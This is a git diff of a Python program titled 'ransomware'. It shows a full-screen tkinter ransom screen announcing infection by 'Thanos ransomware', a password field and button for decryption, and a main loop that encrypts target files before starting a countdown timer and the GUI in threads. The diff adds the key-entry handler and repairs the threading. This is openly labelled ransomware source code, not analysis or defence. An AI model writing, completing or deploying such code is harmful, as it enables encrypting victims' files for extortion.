@@ -21,6 +21,17 @@ import smtplib
 import uuid
 from email.mime.text import MIMEText
 
+
+# 버튼클릭시 복호화될수 있게
+def key_submit():
+    pw = str(password.get())
+    label6 = tkinter.Label(window, text="키가 입력되었다 => "+pw, fg="red", bg="black", font="Helvetica 18 bold")
+    label6.pack()
+    pwbutton.destroy()
+    label4.destroy()
+    password.destroy()
+
+
 # gui 창 객체입니다
 window = tkinter.Tk()
 window.title("ransomware")
@@ -28,12 +39,6 @@ window.state('zoomed')  # maximize the window
 height = window.winfo_height()  # ...
 width = window.winfo_width()
 window.configure(background="black")
-
-
-# 버튼클릭시 복호화될수 있게
-def dec():
-    pw = str(password.get())
-
 
 label1 = tkinter.Label(window, text="타노스 랜섬웨어에 감염되었다.", fg="red", bg="black", font='Helvetica 14 bold')
 label1.pack()
@@ -47,13 +52,14 @@ label4.pack()
 password = tkinter.Entry(window)
 password.pack()
 
-pwbutton = tkinter.Button(window, text="복호화", command=dec)
+pwbutton = tkinter.Button(window, text="복호화", command=key_submit)
 pwbutton.pack()
 
 image = tkinter.PhotoImage(file="ui/face.png")
 
 label5 = tkinter.Label(window, image=image)
 label5.pack()
+
 
 iv = os.urandom(16)
 
@@ -281,16 +287,11 @@ if __name__ == "__main__":
             continue
         enc(key, cipher, enc_target, out_filename=None)
 
-    # 원래 코드
-    '''
-    window.mainloop()
-    startTimer()
-    '''
-
-    # 시도해본 코드
-    th1 = threading.Thread(target=[startTimer()],args=None)
+    # 타이머 시작 코드
+    th1 = threading.Thread(target=startTimer)
     th1.start()
 
+    # gui 시작 코드
     th2 = threading.Thread(window.mainloop())
     th2.start()
 
